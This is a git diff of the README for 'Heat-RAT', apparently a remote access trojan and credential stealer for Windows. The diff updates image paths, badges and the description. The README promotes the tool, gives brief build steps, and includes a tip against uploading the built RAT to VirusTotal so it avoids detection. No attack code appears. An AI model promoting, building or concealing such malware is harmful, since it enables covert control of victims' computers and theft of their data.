@@ -1,20 +1,20 @@
 <a id ="up"></a>
-[![logo](files_for_GitHub/LOGO.png)](https://github.com/Nick-Vinesmoke/Heat-RAT/releases/tag/HeatRAT_v3.0.3)
+[![logo](for_readme/LOGO.png)](https://github.com/Nick-Vinesmoke/Heat-RAT/releases/tag/HeatRAT_v3.0.3)
 <img src="https://img.shields.io/badge/C%2B%2B-00599C?style=for-the-badge&logo=c%2B%2B&logoColor=white">
 <img src="https://img.shields.io/badge/C-00599C?style=for-the-badge&logo=c&logoColor=white">
 <img src="https://img.shields.io/badge/Visual_Studio-5C2D91?style=for-the-badge&logo=visual%20studio&logoColor=white">
 <img src="https://img.shields.io/badge/VSCode-0078D4?style=for-the-badge&logo=visual%20studio%20code&logoColor=white">
 <img src="https://img.shields.io/badge/build-passing-76B900?style=for-the-badge&logo=&logoColor=whit">
-<img src="https://img.shields.io/badge/tests-99/100-76B900?style=for-the-badge&logo=&logoColor=whit">
+<img src="https://img.shields.io/badge/tests-96/100-76B900?style=for-the-badge&logo=&logoColor=whit">
 <img src="https://img.shields.io/badge/code quality-A-76B900?style=for-the-badge&logo=&logoColor=whit">
 <img src="https://img.shields.io/badge/license-MIT-blue?style=for-the-badge&logo=&logoColor=whit">
-<img src="https://img.shields.io/badge/Heat:::RAT-v3.0.3-blue?style=for-the-badge&logo=&logoColor=whit">
+<img src="https://img.shields.io/badge/Heat:::RAT-v4.0.0-blue?style=for-the-badge&logo=&logoColor=whit">
 <img src="https://img.shields.io/badge/Microsoft-666666?style=for-the-badge&logo=microsoft&logoColor=white">
 <img src="https://img.shields.io/badge/Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white">
 
 [RAT+STEALER](https://github.com/Nick-Vinesmoke/Heat-RAT/releases/tag/HeatRAT_v3.0.3)
 ---
-🔭Program for remote control of windows computers via cmd. Written in C++
+🔭Program for remote control of Windows computers. Huge functionality. It has full and lite versions.
 
 ⭐Please, star this repo if it was helpful⭐
 
@@ -136,11 +136,11 @@ __Don't upload builded rat to Virustotal__. The more often you upload it, the mo
  
 ### 🔨Building
 
-![image](files_for_GitHub/Screenshot_1.png)
+![image](for_readme/Screenshot_1.png)
 
 Than press Ctrl+Shift+B. You'll find builted control panel in the folder release. After that, place .exe file like in this photo.
 
-![image](files_for_GitHub/Screenshot_7.png)
+![image](for_readme/Screenshot_7.png)
 
 ---
  ### ⚙How to set up Heat:::RAT
@@ -149,11 +149,11 @@ Than press Ctrl+Shift+B. You'll find builted control panel in the folder release
  ---
 ### 🎴Overview
 
-![image](files_for_GitHub/Screenshot_4.png)
+![image](for_readme/Screenshot_4.png)
 
-![image](files_for_GitHub/Screenshot_5.png)
+![image](for_readme/Screenshot_5.png)
 
-![image](files_for_GitHub/Screenshot_6.png)
+![image](for_readme/Screenshot_6.png)
 
 ---
 
